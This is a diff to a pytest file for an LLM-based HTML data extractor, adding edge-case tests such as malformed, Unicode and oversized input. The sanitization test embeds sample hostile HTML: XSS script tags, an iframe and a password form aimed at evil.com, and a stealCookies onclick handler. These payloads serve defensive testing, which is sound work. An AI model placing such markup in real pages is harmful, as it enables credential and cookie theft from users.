@@ -324,48 +324,8 @@ class TestHTMLDataExtractorE2E:
             elif "revenue" in key.lower() or "quarterly" in key.lower():
                 datapoint_types.add("revenue")
 
-        print(f"\n=== DEBUG: Identified datapoint types ===")
-        print(f"Types found: {datapoint_types}")
-
         # Should have identified at least 2 different types of data
         assert len(datapoint_types) >= 2
-
-    async def test_datapoint_filtering(self):
-        """Test filtering specific datapoints with mixed providers"""
-        # Skip if no API keys
-        if not os.getenv("ANTHROPIC_API_KEY") or not os.getenv("OPENAI_API_KEY"):
-            pytest.skip("ANTHROPIC_API_KEY or OPENAI_API_KEY not set")
-
-        # Use Anthropic for analysis, OpenAI for extraction
-        extractor = HTMLDataExtractor(
-            analysis_provider="anthropic",
-            analysis_model="claude-sonnet-4-20250514",
-            extraction_provider="openai",
-            extraction_model="gpt-4.1",
-        )
-
-        # First, analyze to get datapoint names
-        analysis_result = await extractor.extract_all_data(
-            SAMPLE_HTML["mixed_content"]
-        )
-        
-        # Get first datapoint name
-        if analysis_result.extraction_results:
-            first_datapoint_name = analysis_result.extraction_results[0].datapoint_name
-            
-            # Extract only that specific datapoint
-            filtered_result = await extractor.extract_all_data(
-                SAMPLE_HTML["mixed_content"],
-                datapoint_filter=[first_datapoint_name],
-            )
-            
-            assert filtered_result.successful_extractions <= 1
-            if filtered_result.extraction_results:
-                assert all(
-                    r.datapoint_name == first_datapoint_name
-                    for r in filtered_result.extraction_results
-                    if r.success
-                )
 
     async def test_convenience_function(self):
         """Test the convenience function with Gemini"""
@@ -412,6 +372,276 @@ class TestHTMLDataExtractorE2E:
         assert isinstance(result, HTMLDataExtractionResult)
         # Should handle gracefully
         assert result.total_cost_cents >= 0
+
+
+@pytest.mark.asyncio
+class TestHTMLDataExtractorEdgeCases:
+    """Edge case tests for HTMLDataExtractor"""
+
+    async def test_empty_html(self):
+        """Test extraction from empty HTML"""
+        if not os.getenv("ANTHROPIC_API_KEY"):
+            pytest.skip("ANTHROPIC_API_KEY not set")
+            
+        extractor = HTMLDataExtractor()
+        
+        # Test completely empty string
+        result = await extractor.extract_all_data("")
+        assert isinstance(result, HTMLDataExtractionResult)
+        assert result.total_datapoints_identified == 0
+        assert result.successful_extractions == 0
+        assert result.failed_extractions == 0
+        
+        # Test HTML with no content
+        empty_html = "<html><body></body></html>"
+        result = await extractor.extract_all_data(empty_html)
+        assert isinstance(result, HTMLDataExtractionResult)
+        assert result.total_datapoints_identified == 0
+
+    async def test_malformed_html(self):
+        """Test extraction from malformed HTML"""
+        if not os.getenv("ANTHROPIC_API_KEY"):
+            pytest.skip("ANTHROPIC_API_KEY not set")
+            
+        extractor = HTMLDataExtractor()
+        
+        malformed_htmls = [
+            # Unclosed tags
+            "<html><body><table><tr><td>Data</table>",
+            # Missing closing tags
+            "<div><span>Text<div>More text</div>",
+            # Nested tables with errors
+            "<table><tr><td><table><tr>Nested</tr></td></tr></table>",
+            # Mixed up tag order
+            "<b><i>Bold italic</b></i>",
+        ]
+        
+        for html in malformed_htmls:
+            result = await extractor.extract_all_data(html)
+            assert isinstance(result, HTMLDataExtractionResult)
+            # Should handle gracefully without crashing
+
+    async def test_large_html_document(self):
+        """Test extraction from large HTML document"""
+        if not os.getenv("ANTHROPIC_API_KEY"):
+            pytest.skip("ANTHROPIC_API_KEY not set")
+            
+        # Create HTML that exceeds size limit
+        large_table = "<html><body><table>"
+        for i in range(10000):
+            large_table += f"<tr><td>Row {i}</td><td>Data {i}</td></tr>"
+        large_table += "</table></body></html>"
+        
+        extractor = HTMLDataExtractor(max_html_size_mb=0.1)  # Set small limit
+        
+        with pytest.raises(ValueError) as exc_info:
+            await extractor.extract_all_data(large_table)
+        
+        assert "exceeds maximum size limit" in str(exc_info.value)
+
+    async def test_html_with_no_extractable_data(self):
+        """Test HTML that contains no structured data"""
+        if not os.getenv("ANTHROPIC_API_KEY"):
+            pytest.skip("ANTHROPIC_API_KEY not set")
+            
+        extractor = HTMLDataExtractor()
+        
+        # HTML with only text and no structure
+        text_only_html = """
+        <html>
+        <body>
+            <p>This is just a paragraph of text with no structured data.</p>
+            <p>Another paragraph here.</p>
+            <div>Some more unstructured content.</div>
+        </body>
+        </html>
+        """
+        
+        result = await extractor.extract_all_data(text_only_html)
+        assert isinstance(result, HTMLDataExtractionResult)
+        # Might identify some data or might not, but should complete
+        assert result.total_cost_cents >= 0
+
+    async def test_unicode_and_special_characters(self):
+        """Test HTML with Unicode and special characters"""
+        if not os.getenv("ANTHROPIC_API_KEY"):
+            pytest.skip("ANTHROPIC_API_KEY not set")
+            
+        extractor = HTMLDataExtractor()
+        
+        unicode_html = """
+        <html>
+        <body>
+            <table>
+                <tr>
+                    <th>Product</th>
+                    <th>Price</th>
+                    <th>Description</th>
+                </tr>
+                <tr>
+                    <td>Café Widget™</td>
+                    <td>€19.99</td>
+                    <td>Spëcial chàracters: ñ, ü, ç, 中文, 日本語, 🎉</td>
+                </tr>
+                <tr>
+                    <td>Premium Widget®</td>
+                    <td>¥2999</td>
+                    <td>математика & symbols: ∑∏∫ ≠ ≤ ≥</td>
+                </tr>
+            </table>
+        </body>
+        </html>
+        """
+        
+        result = await extractor.extract_all_data(unicode_html)
+        assert isinstance(result, HTMLDataExtractionResult)
+        assert result.successful_extractions > 0
+        
+        # Check that Unicode was preserved
+        dict_result = await extractor.extract_as_dict(unicode_html)
+        assert len(dict_result["data"]) > 0
+
+    async def test_html_with_scripts_and_styles(self):
+        """Test HTML with script tags and inline styles"""
+        if not os.getenv("ANTHROPIC_API_KEY"):
+            pytest.skip("ANTHROPIC_API_KEY not set")
+            
+        extractor = HTMLDataExtractor()
+        
+        html_with_scripts = """
+        <html>
+        <head>
+            <style>
+                .product { color: red; }
+                table { border: 1px solid black; }
+            </style>
+            <script>
+                console.log('This should be removed');
+            </script>
+            <script type="application/ld+json">
+            {
+                "@context": "https://schema.org",
+                "@type": "Product",
+                "name": "Test Product",
+                "price": "29.99"
+            }
+            </script>
+        </head>
+        <body>
+            <table style="width: 100%; margin: 10px;">
+                <tr style="background: #ccc;">
+                    <td style="padding: 5px;">Product A</td>
+                    <td style="font-weight: bold;">$19.99</td>
+                </tr>
+            </table>
+            <script>alert('XSS attempt');</script>
+        </body>
+        </html>
+        """
+        
+        result = await extractor.extract_all_data(html_with_scripts)
+        assert isinstance(result, HTMLDataExtractionResult)
+        # Should extract data while handling scripts safely
+
+    async def test_caching_functionality(self):
+        """Test that caching works correctly"""
+        if not os.getenv("ANTHROPIC_API_KEY"):
+            pytest.skip("ANTHROPIC_API_KEY not set")
+            
+        extractor = HTMLDataExtractor(enable_caching=True)
+        
+        html = SAMPLE_HTML["simple_table"]
+        
+        # First extraction
+        result1 = await extractor.extract_all_data(html)
+        cost1 = result1.total_cost_cents
+        
+        # Second extraction (should use cache)
+        result2 = await extractor.extract_all_data(html)
+        cost2 = result2.total_cost_cents
+        
+        # Results should be the same
+        assert result1.html_content_hash == result2.html_content_hash
+        assert result1.total_datapoints_identified == result2.total_datapoints_identified
+        
+        # Second call should be from cache (same total cost)
+        assert cost2 == cost1
+
+    async def test_security_sanitization(self):
+        """Test that HTML sanitization removes dangerous content"""
+        if not os.getenv("ANTHROPIC_API_KEY"):
+            pytest.skip("ANTHROPIC_API_KEY not set")
+            
+        extractor = HTMLDataExtractor()
+        
+        dangerous_html = """
+        <html>
+        <body>
+            <table>
+                <tr>
+                    <td>Safe Data</td>
+                    <td><script>alert('XSS')</script>Injected</td>
+                </tr>
+            </table>
+            <iframe src="http://evil.com"></iframe>
+            <object data="malware.exe"></object>
+            <embed src="virus.swf">
+            <form action="http://evil.com/steal">
+                <input name="password" type="password">
+            </form>
+            <a href="javascript:void(0)" onclick="stealCookies()">Click me</a>
+        </body>
+        </html>
+        """
+        
+        result = await extractor.extract_all_data(dangerous_html)
+        assert isinstance(result, HTMLDataExtractionResult)
+        # Should complete successfully with sanitized content
+
+    async def test_deeply_nested_structures(self):
+        """Test extraction from deeply nested HTML structures"""
+        if not os.getenv("ANTHROPIC_API_KEY"):
+            pytest.skip("ANTHROPIC_API_KEY not set")
+            
+        extractor = HTMLDataExtractor()
+        
+        nested_html = """
+        <html>
+        <body>
+            <div class="container">
+                <div class="row">
+                    <div class="col">
+                        <div class="card">
+                            <div class="card-body">
+                                <div class="product-info">
+                                    <span class="name">Product A</span>
+                                    <span class="price">$19.99</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col">
+                        <div class="card">
+                            <div class="card-body">
+                                <div class="product-info">
+                                    <span class="name">Product B</span>
+                                    <span class="price">$29.99</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </body>
+        </html>
+        """
+        
+        result = await extractor.extract_all_data(nested_html)
+        assert isinstance(result, HTMLDataExtractionResult)
+        # Should identify nested product data
+        assert result.total_datapoints_identified > 0
 
 
 if __name__ == "__main__":
